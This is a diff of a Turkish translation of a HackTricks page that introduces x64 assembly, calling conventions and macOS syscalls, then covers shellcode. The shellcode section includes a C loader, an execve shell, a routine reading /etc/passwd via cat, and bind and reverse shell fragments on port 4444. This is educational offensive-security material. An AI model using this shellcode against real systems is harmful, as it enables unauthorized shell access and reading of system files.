@@ -1,86 +1,88 @@
-# x64'ün Tanıtımı
+# Introduction to x64
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>
+<summary>Support HackTricks</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
-* [**Resmi PEASS & HackTricks ürünleri**]'ni edinin (https://peass.creator-spring.com)
-* [**PEASS Ailesi**]'ni keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'ler**] koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**] (https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**] veya bizi **Twitter** 🐦 [**@carlospolopm**] (https://twitter.com/hacktricks_live) takip edin.
-* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**] (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**] (https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## **x64'ün Tanıtımı**
+## **Introduction to x64**
 
-x64, aynı zamanda x86-64 olarak da bilinir, masaüstü ve sunucu bilgisayarlarında yaygın olarak kullanılan 64-bit işlemci mimarisidir. Intel tarafından üretilen x86 mimarisinden türemiş ve daha sonra AMD tarafından AMD64 adıyla benimsenmiştir, bugün kişisel bilgisayarlarda ve sunucularda yaygın olarak kullanılan mimaridir.
+x64, ayrıca x86-64 olarak bilinir, esas olarak masaüstü ve sunucu bilgisayarlarında kullanılan 64-bit bir işlemci mimarisidir. Intel tarafından üretilen x86 mimarisinden türetilmiş ve daha sonra AMD tarafından AMD64 adıyla benimsenmiştir; günümüzde kişisel bilgisayarlar ve sunucularda yaygın olarak kullanılan mimaridir.
 
-### **Registerlar**
+### **Registers**
 
-x64, x86 mimarisini genişleterek **16 genel amaçlı register** içerir: `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` ve `r8` ile `r15`. Her biri **64-bit** (8-byte) bir değer saklayabilir. Bu registerlar uyumluluk ve belirli görevler için 32-bit, 16-bit ve 8-bit alt-registerlara sahiptir.
+x64, x86 mimarisini genişleterek **16 genel amaçlı kayıt** sunar: `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, ve `r8` ile `r15`. Her biri **64-bit** (8-byte) bir değeri saklayabilir. Bu kayıtlar ayrıca uyumluluk ve belirli görevler için 32-bit, 16-bit ve 8-bit alt kayıtlar içerir.
 
-1. **`rax`** - Genellikle fonksiyonlardan **dönüş değerleri** için kullanılır.
-2. **`rbx`** - Bellek işlemleri için genellikle bir **baz register** olarak kullanılır.
-3. **`rcx`** - Genellikle **döngü sayıcıları** için kullanılır.
-4. **`rdx`** - Genişletilmiş aritmetik işlemler de dahil olmak üzere çeşitli rollerde kullanılır.
-5. **`rbp`** - Yığın çerçevesi için **baz işaretçisi**.
-6. **`rsp`** - Yığının en üstünü takip eden **yığın işaretçisi**.
-7. **`rsi`** ve **`rdi`** - Dize/bellek işlemlerinde **kaynak** ve **hedef** dizinleri için kullanılır.
-8. **`r8`** ile **`r15`** - x64'te tanıtılan ek genel amaçlı registerlar.
+1. **`rax`** - Geleneksel olarak **fonksiyonlardan dönen değerler** için kullanılır.
+2. **`rbx`** - Genellikle bellek işlemleri için bir **temel kayıt** olarak kullanılır.
+3. **`rcx`** - Sıklıkla **döngü sayacı** olarak kullanılır.
+4. **`rdx`** - Uzatılmış aritmetik işlemler de dahil olmak üzere çeşitli rollerde kullanılır.
+5. **`rbp`** - Yığın çerçevesi için **temel işaretçi**.
+6. **`rsp`** - **Yığın işaretçisi**, yığının en üstünü takip eder.
+7. **`rsi`** ve **`rdi`** - Dize/bellek işlemlerinde **kaynak** ve **hedef** indeksleri için kullanılır.
+8. **`r8`** ile **`r15`** - x64'te tanıtılan ek genel amaçlı kayıtlar.
 
-### **Çağrı Sözleşmesi**
+### **Calling Convention**
 
-x64 çağrı sözleşmesi işletim sistemlerine göre değişir. Örneğin:
+x64 çağrı konvansiyonu işletim sistemlerine göre değişir. Örneğin:
 
-* **Windows**: İlk **dört parametre**, **`rcx`**, **`rdx`**, **`r8`** ve **`r9`** registerlarına iletilir. Daha fazla parametre yığına itilir. Dönüş değeri **`rax`** registerındadır.
-* **System V (genellikle UNIX benzeri sistemlerde kullanılır)**: İlk **altı tamsayı veya işaretçi parametreleri**, **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** ve **`r9`** registerlarına iletilir. Dönüş değeri de **`rax`** registerındadır.
+* **Windows**: İlk **dört parametre** **`rcx`**, **`rdx`**, **`r8`** ve **`r9`** kayıtlarında geçilir. Diğer parametreler yığına itilir. Dönen değer **`rax`** içindedir.
+* **System V (genellikle UNIX benzeri sistemlerde kullanılır)**: İlk **altı tamsayı veya işaretçi parametre** **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** ve **`r9`** kayıtlarında geçilir. Dönen değer de **`rax`** içindedir.
 
-Eğer fonksiyonun altıdan fazla girişi varsa, **geri kalanlar yığına iletilir**. **RSP**, yığın işaretçisi, **16 byte hizalanmış** olmalıdır, yani herhangi bir çağrıdan önce işaret ettiği adresin 16'ya bölünebilir olması gerekir. Bu normalde, bir fonksiyon çağrısından önce shellcode'umuzda RSP'nin uygun şekilde hizalandığından emin olmamız gerektiği anlamına gelir. Ancak uygulamada, sistem çağrıları bu gereksinimi karşılamadığında bile birçok kez çalışır.
+Fonksiyonun altıdan fazla girişi varsa, **geri kalan yığında geçilecektir**. **RSP**, yığın işaretçisi, **16 byte hizalanmış** olmalıdır; bu, işaret ettiği adresin herhangi bir çağrıdan önce 16'ya tam bölünebilir olması gerektiği anlamına gelir. Bu, genellikle bir fonksiyon çağrısı yapmadan önce RSP'nin düzgün bir şekilde hizalanmasını sağlamamız gerektiği anlamına gelir. Ancak pratikte, sistem çağrıları bu gereklilik karşılanmasa bile birçok kez çalışır.
 
-### Swift'te Çağrı Sözleşmesi
+### Calling Convention in Swift
 
-Swift'in kendi **çağrı sözleşmesi** [**burada bulunabilir**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
+Swift'in kendi **çağrı konvansiyonu** vardır, [**burada bulabilirsiniz**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
 
-### **Yaygın Komutlar**
+### **Common Instructions**
 
-x64 komutları, önceki x86 komutlarıyla uyumluluğu korurken yeni komutlar da tanıtır.
+x64 talimatları, önceki x86 talimatlarıyla uyumluluğu koruyarak ve yenilerini tanıtarak zengin bir set sunar.
 
-* **`mov`**: Bir değeri başka bir **register** veya **bellek konumuna** taşır.
-* Örnek: `mov rax, rbx` — `rbx`'den `rax`'e değeri taşır.
-* **`push`** ve **`pop`**: Değerleri **yığına** itme veya yığından çekme.
+* **`mov`**: Bir **değeri** bir **kayıttan** veya **bellek konumundan** diğerine **taşır**.
+* Örnek: `mov rax, rbx` — `rbx`'teki değeri `rax`'e taşır.
+* **`push`** ve **`pop`**: Değerleri **yığına** itme veya yığından alma.
 * Örnek: `push rax` — `rax`'teki değeri yığına iter.
-* Örnek: `pop rax` — Yığının en üstündeki değeri `rax`'e çeker.
+* Örnek: `pop rax` — Yığının en üstündeki değeri `rax`'e alır.
 * **`add`** ve **`sub`**: **Toplama** ve **çıkarma** işlemleri.
-* Örnek: `add rax, rcx` — `rax` ve `rcx`'teki değerleri toplar ve sonucu `rax`'e saklar.
-* **`mul`** ve **`div`**: **Çarpma** ve **bölme** işlemleri. Not: Bu işlemler operand kullanımı açısından belirli davranışlara sahiptir.
-* **`call`** ve **`ret`**: Fonksiyonları **çağırmak** ve **dönmek** için kullanılır.
-* **`int`**: Yazılım **kesmesi** tetiklemek için kullanılır. Örn., 32-bit x86 Linux'ta sistem çağrıları için `int 0x80` kullanılmıştır.
-* **`cmp`**: İki değeri karşılaştırır ve CPU'nun bayraklarını sonuca göre ayarlar.
-* Örnek: `cmp rax, rdx` — `rax`'i `rdx` ile karşılaştırır.
-* **`je`, `jne`, `jl`, `jge`, ...**: Önceki bir `cmp` veya testin sonuçlarına göre kontrol akışını değiştiren **koşullu atlama** komutları.
+* Örnek: `add rax, rcx` — `rax` ve `rcx`'teki değerleri toplar ve sonucu `rax`'te saklar.
+* **`mul`** ve **`div`**: **Çarpma** ve **bölme** işlemleri. Not: Bunların operand kullanımıyla ilgili belirli davranışları vardır.
+* **`call`** ve **`ret`**: **Fonksiyonları çağırmak** ve **dönmek** için kullanılır.
+* **`int`**: Yazılım **kesintisi** tetiklemek için kullanılır. Örneğin, `int 0x80` 32-bit x86 Linux'ta sistem çağrıları için kullanılmıştır.
+* **`cmp`**: İki değeri **karşılaştırır** ve sonuca göre CPU'nun bayraklarını ayarlar.
+* Örnek: `cmp rax, rdx` — `rax`'ı `rdx` ile karşılaştırır.
+* **`je`, `jne`, `jl`, `jge`, ...**: Önceki bir `cmp` veya testin sonuçlarına göre kontrol akışını değiştiren **koşullu atlama** talimatları.
 * Örnek: `cmp rax, rdx` talimatından sonra, `je label` — `rax` `rdx`'e eşitse `label`'e atlar.
-* **`syscall`**: Bazı x64 sistemlerinde (modern Unix gibi) **sistem çağrıları** için kullanılır.
-* **`sysenter`**: Bazı platformlarda optimize edilmiş bir **sistem çağrısı** talimatı.
+* **`syscall`**: Bazı x64 sistemlerde (modern Unix gibi) **sistem çağrıları** için kullanılır.
+* **`sysenter`**: Bazı platformlarda optimize edilmiş bir **sistem çağrısı** talimatıdır.
 
-### **Fonksiyon Prologu**
+### **Function Prologue**
 
-1. **Eski baz işaretçisini yığına itme**: `push rbp` (çağrıcının baz işaretçisini kaydeder)
-2. **Mevcut yığın işaretçisini baz işaretçisine taşıma**: `mov rbp, rsp` (geçerli işlev için yeni baz işaretçisini ayarlar)
-3. **Yerel değişkenler için yığında alan ayırma**: `sub rsp, <boyut>` (<boyut> ihtiyaç duyulan bayt sayısıdır)
+1. **Eski temel işaretçiyi it**: `push rbp` (çağıranın temel işaretçisini kaydeder)
+2. **Mevcut yığın işaretçisini temel işaretçiye aktar**: `mov rbp, rsp` (mevcut fonksiyon için yeni temel işaretçiyi ayarlar)
+3. **Yerel değişkenler için yığında alan ayır**: `sub rsp, <size>` (burada `<size>`, gereken byte sayısıdır)
 
-### **Fonksiyon Epilogu**
+### **Function Epilogue**
 
-1. **Mevcut baz işaretçisini yığın işaretçisine taşıma**: `mov rsp, rbp` (yerel değişkenleri serbest bırakır)
-2. **Eski baz işaretçisini yığından çıkarma**: `pop rbp` (çağrıcının baz işaretçisini geri yükler)
-3. **Dönüş**: `ret` (kontrolü çağırıcıya geri döndürür)
+1. **Mevcut temel işaretçiyi yığın işaretçisine aktar**: `mov rsp, rbp` (yerel değişkenleri serbest bırak)
+2. **Eski temel işaretçiyi yığından al**: `pop rbp` (çağıranın temel işaretçisini geri yükler)
+3. **Dön**: `ret` (kontrolü çağırana geri verir)
+
 ## macOS
 
-### sistem çağrıları
+### syscalls
 
-Farklı sistem çağrıları sınıfları bulunmaktadır, bunları [**burada bulabilirsiniz**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+Farklı syscall sınıfları vardır, [**burada bulabilirsiniz**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -89,7 +91,7 @@ Farklı sistem çağrıları sınıfları bulunmaktadır, bunları [**burada bul
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-Sonra, her sistem çağrısı numarasını [**bu URL'de**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)** bulabilirsiniz:**
+Sonra, her syscall numarasını [**bu URL'de**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:** bulabilirsiniz.
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -106,11 +108,11 @@ Sonra, her sistem çağrısı numarasını [**bu URL'de**](https://opensource.ap
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-Yani `open` sistem çağrısını (**5**) **Unix/BSD sınıfından** çağırmak için eklemeniz gereken şey: `0x2000000`
+Bu nedenle, **Unix/BSD sınıfından** `open` syscall'ını (**5**) çağırmak için bunu eklemeniz gerekir: `0x2000000`
 
-Yani, open çağrısını yapmak için sistem çağrı numarası `0x2000005` olacaktır
+Yani, open'ı çağırmak için syscall numarası `0x2000005` olacaktır.
 
-### Kabuk Kodları
+### Shellcodlar
 
 Derlemek için:
 
@@ -137,7 +139,7 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 
 <details>
 
-<summary>Shellcode'ı test etmek için C kodu</summary>
+<summary>Shellcode'u test etmek için C kodu</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -185,9 +187,9 @@ return 0;
 ```
 </details>
 
-#### Kabuk
+#### Shell
 
-[**buradan**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.
+[**buradan**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) alındı ve açıklandı.
 
 {% tabs %}
 {% tab title="adr ile" %}
@@ -207,7 +209,7 @@ syscall
 ```
 {% endtab %}
 
-{% tab title="yığınla birlikte" %}
+{% tab title="yığın ile" %}
 ```armasm
 bits 64
 global _main
@@ -226,9 +228,9 @@ syscall
 {% endtab %}
 {% endtabs %}
 
-#### Cat ile okuma
+#### cat ile oku
 
-Amacımız `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmaktır, bu yüzden ikinci argüman (x1) parametrelerin bir dizisi olmalıdır (bellekte bu adreslerin bir yığını anlamına gelir).
+Amaç `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmaktır, bu nedenle ikinci argüman (x1) bir parametreler dizisidir (bellekte bu, adreslerin bir yığını anlamına gelir).
 ```armasm
 bits 64
 section .text
@@ -297,9 +299,9 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### Bağlama kabuğu
+#### Bind shell
 
-Bağlama kabuğu [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) üzerinden **4444 numaralı bağlantı noktası**'nda.
+**port 4444**'te [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) adresinden Bind shell
 ```armasm
 section .text
 global _main
@@ -374,9 +376,9 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### Ters Kabuk
+#### Ters Shell
 
-Ters kabuk [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) adresinden alınabilir. Ters kabuk **127.0.0.1:4444** adresine yönlendirilir.
+Ters shell [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) adresinden. Ters shell **127.0.0.1:4444** adresine.
 ```armasm
 section .text
 global _main
@@ -438,16 +440,17 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olmaya kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
